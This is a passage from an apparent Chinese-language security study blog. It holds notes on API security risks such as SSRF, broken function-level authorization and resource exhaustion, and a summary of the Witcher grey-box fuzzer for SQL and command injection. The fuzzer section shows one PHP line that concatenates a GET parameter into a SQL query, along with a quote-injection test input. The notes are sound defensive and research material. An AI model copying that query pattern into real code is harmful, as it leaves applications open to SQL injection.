的成因</h3><ol><li><strong>缺乏资源限制机制</strong>：<ul><li>开发者在设计系统时没有考虑资源消耗的限制，例如没有设定最大内存使用量、最大上传文件大小或最大并发请求数。</li></ul></li><li><strong>不安全的用户输入处理</strong>：<ul><li>应用程序没有对用户输入进行有效验证，导致用户能够通过恶意输入或请求消耗大量系统资源。</li></ul></li><li><strong>缺乏资源回收机制</strong>：<ul><li>应用程序没有适当的垃圾回收或资源释放机制，导致长时间运行的进程或服务逐渐消耗更多资源。</li></ul></li><li><strong>不正确的并发控制</strong>：<ul><li>并发控制不足可能导致资源竞争加剧，系统无法有效地管理并发请求，从而导致资源被快速耗尽。</li></ul></li></ol><h3 id="Unrestricted-Resource-Consumption-的影响"><a href="#Unrestricted-Resource-Consumption-的影响" class="headerlink" title="Unrestricted Resource Consumption 的影响"></a>Unrestricted Resource Consumption 的影响</h3><ul><li><strong>性能下降</strong>：系统响应变慢，影响用户体验。</li><li><strong>服务不可用</strong>：资源耗尽可能导致系统崩溃或服务中断。</li><li><strong>拒绝服务（DoS）攻击</strong>：攻击者可以利用这一漏洞通过资源耗尽手段发起DoS攻击，使合法用户无法访问服务。</li><li><strong>成本增加</strong>：资源消耗过高可能导致服务器或云服务费用急剧增加。</li></ul><h3 id="防范-Unrestricted-Resource-Consumption-的方法"><a href="#防范-Unrestricted-Resource-Consumption-的方法" class="headerlink" title="防范 Unrestricted Resource Consumption 的方法"></a>防范 Unrestricted Resource Consumption 的方法</h3><ol><li><strong>资源限制与配额</strong>：<ul><li>对每个用户或进程设定资源配额，如最大内存、CPU使用率、带宽限制等。</li><li>使用系统工具或容器技术（如Docker、Kubernetes）来限制应用程序的资源使用。</li></ul></li><li><strong>请求限速和排队</strong>：<ul><li>实施请求限速机制，限制用户请求的频率和数量。</li><li>使用排队机制来处理并发请求，确保系统资源分配合理。</li></ul></li><li><strong>输入验证与处理</strong>：<ul><li>严格验证用户输入，防止恶意数据导致资源消耗。</li><li>实施文件上传大小限制，并检查文件内容类型和格式。</li></ul></li><li><strong>资源监控与预警</strong>：<ul><li>实时监控系统资源使用情况，并在资源使用接近阈值时发出预警。</li><li>自动化工具可以在资源使用过高时采取措施，如限制进程、清理无用数据等。</li></ul></li><li><strong>定期审计和优化</strong>：<ul><li>定期检查和优化代码，寻找和修复潜在的资源泄漏问题。</li><li>优化数据库查询、算法和内存管理，以减少不必要的资源消耗。</li></ul></li></ol><h2 id="Broken-Function-Level-Authorization"><a href="#Broken-Function-Level-Authorization" class="headerlink" title="Broken Function Level Authorization"></a>Broken Function Level Authorization</h2><p><strong>Broken Function Level Authorization (BFLA)</strong> 是一种Web应用程序或API中的安全漏洞，发生在应用程序未能正确实施功能级别的访问控制，导致未经授权的用户可以访问或执行特定功能（如查看、修改或删除数据）。这种漏洞可能使得攻击者能够执行超出其权限的操作，造成严重的安全隐患。</p><h3 id="Broken-Function-Level-Authorization-的工作原理"><a href="#Broken-Function-Level-Authorization-的工作原理" class="headerlink" title="Broken Function Level Authorization 的工作原理"></a>Broken Function Level Authorization 的工作原理</h3><p>在典型的Web应用程序或API中，功能（如创建、读取、更新、删除数据的操作）通常是根据用户的角色或权限来限制的。例如，管理员可以访问所有功能，而普通用户只能访问有限的功能。</p><p>BFLA漏洞发生时，应用程序没有正确地验证用户是否有权访问特定的功能。这可能是因为缺少功能级别的授权检查，或者这些检查没有得到正确实现。</p><ol><li><strong>角色权限误配置</strong>：<ul><li>一个应用程序允许普通用户访问管理员的功能，比如修改用户权限、查看所有用户的敏感信息等。如果应用程序没有在执行这些功能时检查用户是否具有管理员权限，普通用户可能会通过直接访问相应的URL或API端点来执行管理员操作。</li></ul></li><li><strong>未隐藏的功能</strong>：<ul><li>某些功能可能在UI中隐藏起来，但仍然可以通过直接访问URL或API调用来触发。如果这些功能没有进行适当的权限检查，攻击者可以利用这一漏洞访问或执行不该被其访问的功能。</li></ul></li><li><strong>API端点授权不当</strong>：<ul><li>API设计中可能存在不同端点为不同角色设计，但应用程序并未严格检查API请求的来源或用户权限。例如，一个端点允许普通用户查看自己的数据，另一个端点允许管理员查看所有用户的数据，如果普通用户能够直接访问管理员端点，就会导致BFLA问题。</li></ul></li></ol><h2 id="Unrestricted-Access-to-Sensitive-Business-Flows"><a href="#Unrestricted-Access-to-Sensitive-Business-Flows" class="headerlink" title="Unrestricted Access to Sensitive Business Flows"></a>Unrestricted Access to Sensitive Business Flows</h2><p>对敏感业务流程的不受限制访问是指用户或攻击者能够未经适当授权，访问或操作某些业务系统中的敏感流程或功能。这种漏洞通常出现在关键的业务系统中，如果不加以控制，可能导致严重的安全问题和数据泄露。</p><h3 id="典型场景包括："><a href="#典型场景包括：" class="headerlink" title="典型场景包括："></a>典型场景包括：</h3><ol><li><strong>未受限的交易操作</strong>：用户能够执行诸如转账、付款或修改重要数据的操作，而没有通过适当的身份验证或授权检查。</li><li><strong>未保护的业务功能</strong>：攻击者可能通过手动构造请求或改变参数，访问管理员或其他高级用户才能使用的功能。</li><li><strong>缺乏授权控制</strong>：系统中对不同角色的权限划分不清晰，导致低权限用户能够访问高级权限用户的功能或数据。</li></ol><h3 id><a href="#" class="headerlink" title></a></h3><h2 id="Server-Side-Request-Forgery"><a href="#Server-Side-Request-Forgery" class="headerlink" title="Server Side Request Forgery"></a>Server Side Request Forgery</h2><p>服务端请求伪造，是一种网络安全漏洞，攻击者利用该漏洞通过受害服务器发送恶意请求，访问本不应该被直接访问的资源。与常见的客户端攻击不同，SSRF 是由服务器发起的。</p><h3 id="SSRF-的工作原理："><a href="#SSRF-的工作原理：" class="headerlink" title="SSRF 的工作原理："></a>SSRF 的工作原理：</h3><p>攻击者通过控制应用程序，使服务器发出请求去访问内部或外部资源。由于服务器往往信任内部网络和受限资源，攻击者可以利用这个漏洞来访问内部网络中的敏感信息或资源。</p><h3 id="SSRF-的典型场景："><a href="#SSRF-的典型场景：" class="headerlink" title="SSRF 的典型场景："></a>SSRF 的典型场景：</h3><ol><li><strong>访问内部资源</strong>：攻击者通过 SSRF 漏洞访问服务器内部网络，获取未公开的服务、数据库、API 等内部资源。</li><li><strong>与外部服务交互</strong>：攻击者伪造请求，利用服务器与外部服务交互，可能用来扫描外部系统漏洞或窃取敏感信息。</li><li><strong>获取云服务凭据</strong>：在云环境中，攻击者可能通过 SSRF 攻击访问云实例的元数据服务，获取访问云资源的凭据。</li><li><strong>攻击本地文件系统</strong>：攻击者可能利用 SSRF 访问服务器本地文件或系统功能，通过特定请求读取敏感文件或操作系统命令。</li></ol><h3 id="典型-SSRF-攻击流程："><a href="#典型-SSRF-攻击流程：" class="headerlink" title="典型 SSRF 攻击流程："></a>典型 SSRF 攻击流程：</h3><ol><li>攻击者发现应用程序存在输入点，可以让服务器发出 HTTP 请求。</li><li>攻击者修改请求参数，构造恶意 URL 地址，指向攻击目标（如内部服务、文件或外部系统）。</li><li>服务器处理该请求并访问攻击者指定的资源，导致信息泄露或进一步的攻击。</li></ol><h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h2 id="Security-Misconfiguration"><a href="#Security-Misconfiguration" class="headerlink" title="Security Misconfiguration"></a>Security Misconfiguration</h2><p>系统、应用程序或网络设备在部署时未按照最佳安全实践进行配置，或未及时更新补丁和设置，从而导致潜在的安全风险。这种漏洞可能让攻击者利用系统或应用程序的错误配置，获得未经授权的访问，执行恶意操作，或窃取敏感数据。</p><h3 id="常见的-Security-Misconfiguration-场景："><a href="#常见的-Security-Misconfiguration-场景：" class="headerlink" title="常见的 Security Misconfiguration 场景："></a>常见的 Security Misconfiguration 场景：</h3><ol><li><strong>默认配置未修改</strong>：<ul><li>使用系统或软件的默认用户名和密码。</li><li>使用默认端口或设置，这些默认值通常是众所周知的，易被攻击者利用。</li></ul></li><li><strong>不必要的功能启用</strong>：<ul><li>启用了未使用的服务、API 或者不必要的端口，增加了系统的攻击面。</li><li>开发调试功能未关闭，如调试模式、详细的错误信息输出等，攻击者可以利用这些信息进一步攻击系统。</li></ul></li><li><strong>未及时更新补丁</strong>：<ul><li>系统、软件或库未打上最新的安全补丁，导致已知漏洞仍然存在并且可能被利用。</li></ul></li><li><strong>不安全的默认权限</strong>：<ul><li>文件、目录或数据库等资源配置了过高的权限，允许任何用户读写操作，可能导致数据泄露或篡改。</li></ul></li><li><strong>安全设置未配置或配置错误</strong>：<ul><li>未启用 HTTPS 加密通信。</li><li>HTTP 头中缺少重要的安全头（如 <code>Content-Security-Policy</code>、<code>X-Frame-Options</code>），使得系统容易受到常见的攻击如跨站脚本攻击 (XSS) 或点击劫持。</li></ul></li><li><strong>云服务配置错误</strong>：<ul><li>云存储（如 AWS S3 桶）未正确配置为私有，导致敏感文件对公众开放。</li><li>云基础设施的权限策略错误配置，使得攻击者能够访问管理功能或敏感数据。</li></ul></li></ol><h2 id="Improper-Inventory-Management"><a href="#Improper-Inventory-Management" class="headerlink" title="Improper Inventory Management"></a>Improper Inventory Management</h2><p>在网络安全领域是指组织未能有效管理和追踪其系统、软件、硬件、网络设备、数据存储以及其他相关资产，导致潜在的安全漏洞、未授权访问或合规性问题。正确的资产管理是安全防护的基础，帮助组织了解哪些系统、服务或数据是关键，确保这些资产受到适当的保护。</p><h2 id="Unsafe-Consumption-of-APIs"><a href="#Unsafe-Consumption-of-APIs" class="headerlink" title="Unsafe Consumption of APIs"></a>Unsafe Consumption of APIs</h2><p><strong>Unsafe Consumption of APIs</strong>（不安全的API使用）是指在开发和集成应用程序时，不安全或不恰当地使用应用程序编程接口（APIs），导致系统暴露在潜在的安全风险中。API是应用之间传递数据的桥梁，但如果开发者未能遵循安全最佳实践，可能会导致敏感数据泄露、权限绕过或其他安全漏洞。</p><h3 id="Unsafe-Consumption-of-APIs-具体表现："><a href="#Unsafe-Consumption-of-APIs-具体表现：" class="headerlink" title="Unsafe Consumption of APIs 具体表现："></a>Unsafe Consumption of APIs 具体表现：</h3><ol><li><strong>不受限制的API访问</strong>：<ul><li>没有对API访问进行限制或认证，允许未经验证的用户或恶意者访问敏感资源。</li></ul></li><li><strong>缺乏输入验证</strong>：<ul><li>未对API接收的数据进行有效的验证或过滤，可能导致常见的攻击，例如SQL注入、跨站脚本攻击（XSS）或远程代码执行。</li></ul></li><li><strong>不安全的身份验证和授权</strong>：<ul><li>API未能正确实施身份验证和授权机制，导致未经授权的用户可以访问敏感数据或执行操作。</li></ul></li><li><strong>暴露过多的信息</strong>：<ul><li>API设计中暴露了过多的内部实现细节或敏感信息（如数据库结构、调试信息等），这些信息可能被恶意者利用。</li></ul></li><li><strong>不加密的数据传输</strong>：<ul><li>API请求或响应中的敏感数据（如密码、个人信息）在网络中以明文形式传输，可能被中间人攻击（Man-in-the-Middle, MitM）拦截。</li></ul></li><li><strong>错误的API错误处理</strong>：<ul><li>错误信息过于详细，返回了不必要的调试信息，使攻击者可以通过这些信息推断系统的内部结构或漏洞。</li></ul></li><li><strong>不受信任的第三方API</strong>：<ul><li>集成不受信任的第三方API，未对其安全性进行有效审查，可能导致整个应用被攻击。</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Witcher</title>
    <link href="/2024/04/13/WebFuzz/"/>
    <url>/2024/04/13/WebFuzz/</url>
    
    <content type="html"><![CDATA[<h2 id="Toss-a-Fault-to-Your-Witcher-Applying-Grey-box-Coverage-Guided-Mutational-Fuzzing-to-Detect-SQL-and-Command-Injection-Vulnerabilities"><a href="#Toss-a-Fault-to-Your-Witcher-Applying-Grey-box-Coverage-Guided-Mutational-Fuzzing-to-Detect-SQL-and-Command-Injection-Vulnerabilities" class="headerlink" title="Toss a Fault to Your Witcher: Applying Grey-box Coverage-Guided Mutational Fuzzing to Detect SQL and Command Injection Vulnerabilities"></a>Toss a Fault to Your Witcher: Applying Grey-box Coverage-Guided Mutational Fuzzing to Detect SQL and Command Injection Vulnerabilities</h2><h3 id="将灰盒覆盖引导的变异模糊测试应用于检测SQL和命令注入漏洞"><a href="#将灰盒覆盖引导的变异模糊测试应用于检测SQL和命令注入漏洞" class="headerlink" title="将灰盒覆盖引导的变异模糊测试应用于检测SQL和命令注入漏洞"></a>将灰盒覆盖引导的变异模糊测试应用于检测SQL和命令注入漏洞</h3><p><img src="/2024/04/13/WebFuzz/image-20240414125835089.png" alt="image-20240414125835089"></p><p>作者来自 UCSB SecLab 和 ASU SEFCOM 这两个安全研究大组，目前论文被 IEEE S &amp; P 2023 接收</p><h3 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h3><p>Web应用程序数量的不断增加和支持的框架不断多样化，同时也会带来许多的Web漏洞。这些Web漏洞，如SQL注入，可能对Web应用程序的开发人员、运行Web应用程序的公司以及访问并在网站应用程序上存储数据的最终用户造成灾难性影响。</p><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><p>Web应用程序在Web服务器上运行，并通过网络与其客户端进行交互。客户端通过向Web服务器发送HTTP请求来访问Web应用程序，Web服务器解析并将请求路由到Web应用程序。Web应用程序接受输入，执行适当的操作，并对请求做出响应。在这种架构中，Web服务器充当Web应用程序的网关，而Web应用程序可以用任何编程语言编写。</p><p><strong>CGI Requests</strong> </p><p>通用网关接口（CGI）使Web服务器能够通过将HTTP请求转换为CGI请求来调用可执行程序。尽管许多Web应用程序已将CGI替换为FastCGI、Apache模块和NSAPI插件，但CGI应用程序仍广泛用于嵌入式设备，例如路由器和网络摄像头。</p><p><strong>Injection Vulnerabilities</strong> </p><p>注入漏洞是代码和数据混合的一种情况，当Web应用程序将未经过过滤的用户数据发送到外部解析器时，比如将数据发送到Shell来执行命令或发送到数据库来执行SQL查询时，就会出现这种漏洞。根据漏洞的类型和攻击目标的不同，攻击者可能会注入数据库查询、JavaScript代码、本机应用程序代码、操作系统命令等等。</p><p>在SQL注入漏洞中，攻击者发送一个格式正确的payload，其中包含了SQL代码，这个输入会作为SQL查询发送到数据库。当数据库执行查询时，也会执行攻击者注入的SQL代码。同样，在命令注入漏洞中，攻击者创建的payload会导致额外的Shell命令被执行。</p><h3 id="Witcher"><a href="#Witcher" class="headerlink" title="Witcher"></a>Witcher</h3><h4 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a><strong>白盒</strong></h4><p>白盒静态分析工具依赖于分析Web应用程序的源代码，但源代码并不总是可用。此外，白盒工具通常对特定语言的语义建模，因此将这些工具应用于新的语言或框架较为复杂。</p><h4 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a><strong>黑盒</strong></h4><p>基于黑盒的漏洞扫描器不需要源代码，这些工具生成合法的 Web 应用程序输入来探索应用程序，然后尝试通过发送设计用于触发漏洞的输入到 Web 应用程序来推断漏洞的存在。但这也会导致测试漏洞的输入受到严格限制，因为它们来源于手动策划的字符串或基于专家启发式的漏洞类型模板。因此，黑盒式扫描器会忽略那些超出预先配置的字符串和模板范围的输入触发的漏洞。</p><p>同时黑盒扫描器只能根据Web应用程序的输出推断漏洞。这样的推断可能会出现误报。例如，考虑一个返回HTTP 500状态码（表示内部服务器错误）的Web应用程序。现有的黑盒扫描器如Burp 使用此类错误代码来判断他们的漏洞诱发输入是否成功触发了漏洞。在寻找SQL注入漏洞的黑盒扫描器的情况下，HTTP 500错误可能表明输入导致了SQL错误。然而，这种错误可能是由其他无关问题引起的，比如实现错误而不是安全漏洞。</p><h4 id="灰盒"><a href="#灰盒" class="headerlink" title="灰盒"></a><strong>灰盒</strong></h4><p>最近的一些研究引入了灰盒模糊测试工具的概念（BackREST，WebFuzz）用于自动测试Web应用程序。这些工具使用覆盖率信息来指导输入的生成。但这些方法只针对单一语言，无法检测SQL或命令注入漏洞，并且不是开源的，而且相对较慢。</p><p>什么是灰盒覆盖引导模糊测试？</p><p>覆盖引导的变异模糊测试使用静态或动态插桩来收集覆盖率信息，该信息用于识别在程序中执行新执行路径的输入（从而打破了纯黑盒方法），模糊测试工具通过输入测试用例并导致目标应用程序进入不同的程序状态来自动测试应用程序。当模糊器启动时，它会接收一组输入种子，并将其放入测试用例队列中。然后，模糊器从队列中派生新的测试用例，并使用各种变异策略对测试用例进行变异。例如，American Fuzzy Lop (AFL) 使用确定性的变异策略，如位翻转、整数算术和字典插入。此外，AFL还使用随机策略，如随机拼接和从用户提供的字典插入数据。在变异输入之后，模糊器将修改后的输入发送给目标应用程序。</p><p>在覆盖引导的模糊测试中，模糊器捕获近似于程序状态的覆盖率数据，以指导测试用例的选择。模糊器捕获的覆盖率数据近似于程序状态，但比执行轨迹要不完整得多。模糊器通过静态或动态插装获取覆盖率数据。对于静态插装，分析人员使用修改过的编译器编译目标应用程序的源代码。对于动态插装，动态插装工具（如Pin）或修改过以提供覆盖率数据的模拟器（如QEMU-user）在执行过程中产生覆盖信息。之所以近似于程序状态，是因为对于模糊器来说，捕获和分析每次执行的完整执行轨迹过于处理密集。</p><p>当测试用例导致程序达到一个新的位置，或者导致应用程序报错，模糊器会标记该测试用例。通常，这意味着应用程序进入了一个易受攻击的状态 （vulnerable program state）。</p><h4 id="本文提的出Witcher"><a href="#本文提的出Witcher" class="headerlink" title="本文提的出Witcher"></a>本文提的出Witcher</h4><p>本文提出了一种名为Witcher的新型Web漏洞发现框架，受到灰盒覆盖引导模糊测试的启发。主要思想是通过使用执行覆盖率信息来高效地引导随机输入的生成，从而探索Web应用程序的输入空间（而不仅仅依赖于硬编码的启发式规则）。</p><h3 id="面临的挑战"><a href="#面临的挑战" class="headerlink" title="面临的挑战"></a>面临的挑战</h3><h4 id="挑战一-如何检测-Web-应用漏洞被触发？"><a href="#挑战一-如何检测-Web-应用漏洞被触发？" class="headerlink" title="挑战一 如何检测 Web 应用漏洞被触发？"></a>挑战一 如何检测 Web 应用漏洞被触发？</h4><p>检测程序中是否存在漏洞实际上就是要判断程序是否处于 vulnerable program state，对传统二进制软件来说，检测到段错误（segmentation fault）就表示触发了漏洞，但 Web 应用程序来说没有直接的触发信号。</p><h4 id="挑战二-如何生成能打通-Web-应用程序的合理输入？"><a href="#挑战二-如何生成能打通-Web-应用程序的合理输入？" class="headerlink" title="挑战二 如何生成能打通 Web 应用程序的合理输入？"></a>挑战二 如何生成能打通 Web 应用程序的合理输入？</h4><p>Web 应用通常只接受 HTTP 和 CGI 请求，而 fuzzer 生成的 seeds 往往不满足相应结构，不能直接用来探索目标程序的输入空间。</p><h4 id="挑战三-如何有效收集覆盖率信息？"><a href="#挑战三-如何有效收集覆盖率信息？" class="headerlink" title="挑战三 如何有效收集覆盖率信息？"></a>挑战三 如何有效收集覆盖率信息？</h4><p>覆盖导向型的 fuzzer 需要插桩目标应用程序来收集覆盖率信息，但对解释性语言编写的 Web 应用程序来说，插桩收集到的往往是解释器本身而非目标 Web 应用程序的覆盖率信息，这种信息大多是噪音，使得 fuzzer 无法有效探索目标程序的输入空间。</p><h4 id="挑战四-如何有效变异测试用例？"><a href="#挑战四-如何有效变异测试用例？" class="headerlink" title="挑战四 如何有效变异测试用例？"></a>挑战四 如何有效变异测试用例？</h4><p>传统 fuzzer 往往把输入当作无结构的比特流来变异，难以利用 Web 应用中的上下文信息（比如网页表单中的变量名）。</p><h3 id="Witcher各组件"><a href="#Witcher各组件" class="headerlink" title="Witcher各组件"></a>Witcher各组件</h3><p><img src="/2024/04/13/WebFuzz/image-20240415094606244.png" alt="image-20240415094606244"></p><p>Witcher以AFL作为基础，并通过增加组件的方式来应对上述挑战来将该fuzzer应用于web</p><h4 id="Fault-Escalator"><a href="#Fault-Escalator" class="headerlink" title="Fault Escalator"></a><strong>Fault Escalator</strong></h4><p>在传统的二进制模糊测试中，易受攻击状态是由内存损坏漏洞引起的，而二进制模糊器通过检测段错误信号来检测是否使程序进入易受攻击状态。</p><p>SQL注入或命令注入漏洞导致外部解析器将用户输入的数据解释为代码。结合二进制模糊器的思路，可以将外部解析器引发的语法错误视为内存损坏漏洞引发的分段错误信号的类比。</p><p>如果攻击者控制的输入在外部解析器中引发语法错误，那么攻击者可以更改命令，并且很有可能存在可利用的漏洞。因此，当发生解析错误时，”Fault Escalator”将错误升级为分段错误，通知模糊器当前的测试用例导致了易受攻击的程序状态。例如，想象一个执行<code>mysqli_query(\$con,&quot;SELECT ID from tbl where ID=&quot;. \$_GET[&#39;id&#39;])</code>的PHP应用程序，而模糊器将<code>id=1&#39;</code>设置为一个输入，由于单引号导致了一个格式不正确的SQL语句。当页面执行SQL语句时，SQL解析器会返回一个解析错误，该错误会被”Fault Escalator”拦截并升级为段错误。</p><p>考虑到生成语句的随机性，如果随意的构造一个未经过滤的sql语句或者shell命令，也可能会导致解析错误，并导致误报的产生。但对于一个sql注入漏洞的攻击语句来说，不太可能不导致解析错误。同时，触发将参数限制为仅能为一个字符的Web应用程序的错误可能不代表一个可利用的漏洞，这些错误会被标记，并人工进行确认是否是一个可利用的漏洞。通过以上手段，经实验证实，Witcher未能发现的漏洞与Fault Escalator的误报无关，所以这种故障升级策略是有效的。</p><p><strong>命令注入</strong></p><p>Witcher使用dash的命令解释器进行故障升级。Debian Almquist shell，通常简称为dash，是一个轻量级的Unix shell，通常用作Unix系统中的默认shell。例如，使用exec()、system()或passthru()的PHP脚本，或者使用exec()的Node.js脚本，将其命令发送到&#x2F;bin&#x2F;sh，这意味着dash会解析并运行该命令。Witcher版本的dash（与原始版本相比仅有3行代码差异）将解析错误升级为分段错误。</p><p><strong>SQL注入</strong></p><p>为了捕获语法错误，Witcher使用LD_PRELOAD来hook libc库中的recv()函数，该函数用于与数据库通信。每当来自数据库的任何响应包含SQL语法错误消息时，Witcher会触发分段错误。</p><blockquote><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。</p><p>替换前</p><p><img src="/2024/04/13/WebFuzz/image-20240415190234581.png" alt="image-20240415190234581"></p><p>替换后</p><p><img src="/2024/04/13/WebFuzz/image-20240415190253173.png" alt="image-20240415190253173"></p></blockquote><p><strong>跨站脚本攻击</strong></p><p>因为浏览器在解析HTML浏览器在解析HTML时非常宽容，因此要在HTML中可靠且快速地检测跨站脚本漏洞可能是困难的。因此，我们选择关注命令注入和SQL注入。此外，SQL和命令注入漏洞代表了一类在之前的工作中基于变异的模糊测试器很难检测到的漏洞。</p><h4 id="Request-Crawler"><a href="#Request-Crawler" class="headerlink" title="Request Crawler"></a><strong>Request Crawler</strong></h4><p>Reqr（Request Crawler）是一个黑盒爬虫，旨在自主识别HTTP请求及其关联的参数。Reqr能够从各种类型的Web应用中提取HTTP请求，包括那些广泛使用客户端JavaScript构建用户界面的应用。它能够识别Web应用中的链接、表单、提交以及请求等各种组件</p><p>Reqr的运作方式类似于黑盒漏洞扫描工具：它接收一个入口URL，可选地提供有效的登录凭证和登录URL。Reqr使用Node.js库Puppeteer（用于控制Chromium的API）来模拟用户操作并捕获请求 。Reqr启动后，如果需要，它可以登录到Web应用并加载入口页面。一旦页面加载完成，Reqr会对呈现的HTML进行静态分析，以识别创建HTTP请求或HTTP参数的HTML元素，接下来，Reqr在模拟用户事件（例如鼠标点击、填写表单字段和滚动页面）的同时监听HTTP请求。Reqr会通过针对每个接受用户事件的HTML元素系统地触发这些事件。此外，Reqr还使用Gremlins测试工具随机触发用户输入事件（例如点击、表单填写、滚动和输入）。</p><p>当Reqr完成时，它会创建一个包含所有请求信息的文件。Witcher使用这些请求信息来创建模糊测试器的种子（初始测试用例）并构建模糊测试器的字典。</p><h4 id="Request-Harnesses"><a href="#Request-Harnesses" class="headerlink" title="Request Harnesses"></a><strong>Request Harnesses</strong></h4><p>Witcher的HTTP harness将模糊测试器生成的输入转换为有效的请求。由于不同的执行模型，Witcher在处理PHP和CGI二进制文件方面与处理Python、Node.js、Java和基于QEMU的二进制文件方面具有不同的harness设计。对于使用PHP和CGI的web应用程序，Witcher将模糊测试器输入的格式转换为CGI请求。对于Python、Node.js、Java和基于QEMU的二进制文件，Witcher将模糊测试器的输入转换为HTTP请求</p><p><strong>CGI Harness.</strong> 对于PHP（通过php-cgi）和CGI二进制文件，使用相同的harness，因为两者都依赖于CGI请求，并且调用的终端在被调用后会一直运行到完成。对于PHP和CGI二进制文件，HTTP harness使用LD_PRELOAD创建一个fork服务器，在处理输入之前，它会在解释器或二进制文件中启动进程。这个harness会从模糊测试器接收每个新的输入，将输入转换为CGI请求，然后将请求传递到新fork的进程中。</p><p><strong>HTTP Request Harness.</strong> Witcher通过使用关联的HTTP请求Harness来对其他解释型语言和基于QEMU的Web应用进行模糊测试，HTTP Request Harness在AFL和Web服务器之间建立了一个桥梁，以利用Web服务器对Web应用程序的接口。HTTP Harness包括其自己的Fork-Server，从而增加了请求提交的吞吐量。该Harness接收来自模糊测试器的输入，将该输入转换为格式良好的HTTP请求，并将HTTP请求发送到Web服务器。</p><p><strong>Translating Fuzzing Input into a Request.</strong> CGI Harness和HTTP Request Harness充当了模糊测试器和Web应用程序之间的翻译器。Witcher自动为模糊测试器创建了遵循以空终止符分隔的格式的种子。这些种子包括用于Cookies、查询参数、POST变量和其他头部值的字段。因此，模糊测试器基于这个格式创建了测试用例，然后Harness将其转换为适当的请求类型。</p><h4 id="Coverage-Accountant"><a href="#Coverage-Accountant" class="headerlink" title="Coverage Accountant"></a><strong>Coverage Accountant</strong></h4><p>覆盖导向型的 fuzzer 需要插桩目标应用程序来收集覆盖率信息，但对解释性语言编写的 Web 应用程序来说，插桩收集到的往往是解释器本身而非目标 Web 应用程序的覆盖率信息，这种信息大多是噪音，使得 fuzzer 无法有效探索目标程序的输入空间。为此设计了 Coverage Accountant 来更精确地收集覆盖信息，不同类型的解释型语言都需要先将源码翻译成字节码，然后再逐条执行字节码指令，Coverage Accountant 就是在解释器执行指令过程中将代码行数、参数等信息传给 Witcher。而对于 CGI 程序来说则只需使用 AFL 的编译插桩或 QEMU 动态插桩。</p><p>（并不是很懂）</p><h4 id="HTTP-specific-Input-Mutations"><a href="#HTTP-specific-Input-Mutations" class="headerlink" title="HTTP-specific Input Mutations"></a><strong>HTTP-specific Input Mutations</strong></h4><p>传统 fuzzer 往往把输入当作无结构的比特流来变异，难以利用 Web 应用中的上下文信息（比如网页表单中的变量名）。因此实现了 HTTP-specific Input Mutations 以在变量的层面上对参数进行变异</p><p><strong>HTTP参数变异器</strong>通过在fuzzer队列中存储的可能使程序进入脆弱状态的测试用例之间交叉传播唯一的参数名称和值。Witcher一次只模糊测试一个URL终端点，不同测试用例的变量之间通常存在相互依赖关系。通过交叉传播参数，fuzzer提供了更有针对性的测试用例，这些测试用例比随机字节变异更有可能触发新的执行路径。例如，如果一个测试用例包含act&#x3D;a，另一个包含ptype&#x3D;dog_red，那么通过组合它们来变异成更有效的攻击代码。</p><p><strong>HTTP字典变异器</strong>减少了将当前输入与字典中的变量配对所需的执行次数。许多终端点具有多个用途，因此，一个终端点可能有多个使用不同HTTP变量的请求。对于某个终端点，Witcher将Reqr发现的所有HTTP变量放入模糊字典中。HTTP字典变异器利用上下文相似的变量，通过将它们与当前请求进行混合来执行此操作。HTTP字典变异器从字典中随机选择一个到十个变量，并将它们添加到当前测试案例中。</p><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h3><h4 id="RQ1-Witcher-使用的增强性技术是否有效？"><a href="#RQ1-Witcher-使用的增强性技术是否有效？" class="headerlink" title="RQ1: Witcher 使用的增强性技术是否有效？"></a>RQ1: Witcher 使用的增强性技术是否有效？</h4><p>设置了四个配置 AFLR, AFLHR, WiCR, WiCHR 代表启用&#x2F;禁用 coverage acccountant 和 HTTP mutator 的四种情况，在 10 个 microtest 测试代码上运行，结果如下表所示，Witcher 的两种增强性技术极大地改进了 fuzz 效果。</p><p><img src="/2024/04/13/WebFuzz/image-20240415133845810.png" alt="image-20240415133845810"></p><h4 id="RQ2-Witcher-识别-Web-应用程序中的漏洞效果如何？"><a href="#RQ2-Witcher-识别-Web-应用程序中的漏洞效果如何？" class="headerlink" title="RQ2: Witcher 识别 Web 应用程序中的漏洞效果如何？"></a>RQ2: Witcher 识别 Web 应用程序中的漏洞效果如何？</h4><p>为了测试 Witcher 扫描 Web 应用漏洞的实际表现，使用了不同种类应用组成的数据集，其中有 8 个 PHP 应用，5 个路由器固件和 Java &#x2F; Python &#x2F; Node.js 应用各一个，共有 36 个已知的漏洞，对于每个漏洞都人工验证其是否 exploitable。</p><p>本轮实验的结果如下表所示，可以看出 Witcher 不仅检测到了超过六成的已知漏洞，还能许多发现未知的漏洞。而未检测出的漏洞大多是由于攻击点本身没被 crawler 爬取到，比如有些 URL 需要一系列点击操作才能触达或者根本是界面中不显示的隐藏后门。</p><p><img src="/2024/04/13/WebFuzz/image-20240415134006388.png" alt="image-20240415134006388"></p><h4 id="RQ3-Witcher-的代码覆盖率和漏洞扫描效果与黑盒漏洞扫描器和其他工作相比如何？"><a href="#RQ3-Witcher-的代码覆盖率和漏洞扫描效果与黑盒漏洞扫描器和其他工作相比如何？" class="headerlink" title="RQ3:Witcher 的代码覆盖率和漏洞扫描效果与黑盒漏洞扫描器和其他工作相比如何？"></a>RQ3:Witcher 的代码覆盖率和漏洞扫描效果与黑盒漏洞扫描器和其他工作相比如何？</h4><p>Burp 是知名的商业黑盒漏洞扫描器，实验中设置了 Burp (solo) 和 BurpPlus Witcher 两种配置，分别采用内置 crawler 和 Witcher 的 crawler 提供的请求，后者能专注对比 Burp 和 Witcher 在输入生成上的效果，可以看出 Witcher 效果远胜 Burp。唯一的不足是 Witcher 专注于单页请求而不像 Burp 那样可能触发多个页面的状态。</p><p><img src="/2024/04/13/WebFuzz/image-20240415134316237.png" 